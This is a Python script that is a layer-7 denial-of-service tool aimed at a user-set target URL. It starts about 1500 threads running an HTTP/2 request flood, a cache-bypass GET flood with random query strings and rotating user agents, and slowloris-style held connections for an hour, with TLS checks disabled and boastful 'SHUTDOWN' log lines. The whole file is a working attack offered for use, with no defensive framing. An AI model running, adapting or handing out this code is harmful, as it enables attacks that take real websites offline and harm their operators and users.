import random
import threading
import time
from fake_useragent import UserAgent
import requests
from urllib3.exceptions import InsecureRequestWarning

# --- DISABLE SSL WARNINGS (for raw speed) ---
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# --- CONFIG ---
TARGET_URL = "https://example.com"  # REPLACE WITH YOUR TARGET
THREAD_COUNT = 1500  # Number of threads, adjust carefully
REQUEST_DELAY = 0.001  # Minimal delay between requests
RUN_TIME = 3600  # Attack duration in seconds

# --- USER AGENTS & HEADERS ---
ua = UserAgent()
headers_list = [
    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Connection": "keep-alive"},
    {"Accept-Encoding": "gzip, deflate, br", "Cache-Control": "no-cache"},
    {"Accept-Language": "en-US,en;q=0.5", "Upgrade-Insecure-Requests": "1"}
]

# --- CACHE BYPASS PAYLOADS ---
cache_bypass_payloads = [
    "?cache_buster={random}",
    "?cb={random}",
    "?v={random}",
    "?version={random}"
]

# --- SLOWLORIS HEADERS (User-Agent refreshed dynamically) ---
def generate_slowloris_headers():
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "Keep-Alive": "900",
        "Content-Length": "1000000",
        "X-a": f"SHUTDOWN-{random.randint(1, 999999)}"
    }

# --- HTTP/2 FLOOD (if supported) ---
def http2_flood():
    try:
        from h2.connection import H2Connection
        from h2.config import H2Configuration
        import socket

        host = TARGET_URL.replace("https://", "").replace("http://", "").split('/')[0]
        sock = socket.create_connection((host, 443), timeout=5)
        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        stream_id = 1
        end_time = time.time() + RUN_TIME
        while time.time() < end_time:
            headers = [
                (":authority", host),
                (":path", f"/{random.randint(1, 999999)}"),
                (":method", "GET"),
                (":scheme", "https"),
            ]
            conn.send_headers(stream_id, headers)
            sock.sendall(conn.data_to_send())
            time.sleep(0.1)
    except Exception:
        pass

# --- CACHE BYPASS FLOOD ---
def cache_bypass_flood():
    end_time = time.time() + RUN_TIME
    while time.time() < end_time:
        try:
            payload = random.choice(cache_bypass_payloads).format(random=random.randint(1, 999999))
            url = f"{TARGET_URL}{payload}"
            headers = random.choice(headers_list).copy()
            headers["User-Agent"] = ua.random
            requests.get(url, headers=headers, verify=False, timeout=5)
            print(f"[SHUTDOWN] CACHE BYPASS HIT: {url}")
        except Exception:
            pass
        time.sleep(REQUEST_DELAY + random.uniform(0, 0.005))

# --- SLOWLORIS ATTACK ---
def slowloris_attack():
    end_time = time.time() + RUN_TIME
    session = requests.Session()
    while time.time() < end_time:
        try:
            slowloris_headers = generate_slowloris_headers()
            session.get(TARGET_URL, headers=slowloris_headers, stream=True, timeout=1000)
            print(f"[SHUTDOWN] SLOWLORIS CONNECTION OPEN: {TARGET_URL}")
            time.sleep(1000)  # Keep connection open as long as possible
        except Exception:
            pass

# --- MAIN ATTACK ---
def start_attack():
    print(f"[SHUTDOWN] UNLEASHING LAYER 7 HELL ON {TARGET_URL}!")
    for _ in range(THREAD_COUNT // 3):
        threading.Thread(target=http2_flood, daemon=True).start()
        threading.Thread(target=cache_bypass_flood, daemon=True).start()
        threading.Thread(target=slowloris_attack, daemon=True).start()

# --- RUN ---
if __name__ == "__main__":
    start_attack()
